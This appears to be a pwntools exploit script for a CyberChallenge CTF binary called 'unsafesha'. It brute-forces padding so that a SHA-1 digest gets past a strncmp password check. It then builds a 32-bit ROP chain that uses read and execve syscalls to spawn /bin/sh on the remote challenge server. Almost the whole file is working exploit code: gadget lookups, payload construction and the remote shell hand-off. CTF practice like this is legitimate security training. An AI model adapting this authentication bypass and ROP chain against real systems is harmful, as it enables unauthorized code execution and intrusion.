#!/usr/bin/env python3

from pwn import *
import hashlib
import string

exe = ELF("./unsafesha")

context.binary = exe

# A few random tests (literally there was no logic behind those tests)
# led to this string which gives the correct substring in the digest.
# The substring needed is: digest[0:4] == 'f9d9' so, after the XORs,
# the resulted modified digest will be 'n\x00' and will bypass "strncmp" check
PADDING = b'not so easy, uh?' * 6 + b'axyY'


'''
# SNIPPET OF CODE FOR THE TESTS (PADDING was just "b'not so easy, uh?' * 6")
# NOTE: The payload contains \x00 bytes, so the "ccread" function stops reading
#       before the actual end. So the test was conducted with "p32(pop_edx_ecx_ebx) + b'\x08" as payload

for c1 in string.ascii_letters + string.digits:
    for c2 in string.ascii_letters + string.digits:
        for c3 in string.ascii_letters + string.digits:
            for c4 in string.ascii_letters + string.digits:

                hash_object = hashlib.sha1(PADDING + (c1+c2+c3+c4).encode("ascii") + payload)
                hex_dig = hash_object.hexdigest()

                if hex_dig[:4] == 'f9d9':
                    print(c1+c2+c3+c4)
                    print(hex_dig)
                    exit(1)
'''

# NOTE: There's a patched version of the program in which the "exit" function was edited with a "mov eax, 3"
#       to emulate the 'logging' behaviour, so we can first create the payload and then create the correct
#       padding to bypass the "strncmp" check



def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        
        if args.DDEBUG:
            gdb.attach(r, '''
                b *main+195 
                ''')
    else:
        r = remote("unsafesha.challs.cyberchallenge.it", 9262)

    return r



def spawn_shell():
    rop = ROP(exe)

    #         $eax  $ebx                    $ecx                        $edx
    # READ:   0x03  unsigned int fd         char *buf                   size_t count
    # EXECVE: 0x0b  const char *filename    const char *const *argv     const char *const *envp

    pop_edx_ecx_ebx = rop.find_gadget(['pop edx', 'pop ecx', 'pop ebx', 'ret'])[0]
    int_0x80        = rop.find_gadget(['int 0x80', 'ret'])[0]
    or_al_ch        = 0x080488f7        # or al, ch; ret;

    # NOTE: After logging in, $eax = 0x3 so we don't need to setup the register for the read
    payload =  PADDING + p32(pop_edx_ecx_ebx) + p32(8) + p32(0x804b000) + p32(0) + p32(int_0x80)    # Write string to a writeable location
    payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0x300) + p32(0) + p32(or_al_ch)                  # Fix $eax with 'or' so we have 0x0b as syscall ($eax contains the number of bytes written, so 8)
    payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(0x804b000) + p32(int_0x80)              # Setup registers for EXECVE and syscall it


    r.sendlineafter(b'Password: ', payload)

    # input('Press ENTER to send the string...')      # Uncomment it in case the script is faster than the program (usually happens in LOCAL)
    r.sendline(b'/bin/sh\x00')



def main():
    r = conn()

    spawn_shell()
    r.interactive('$ ')


if __name__ == "__main__":
    main()
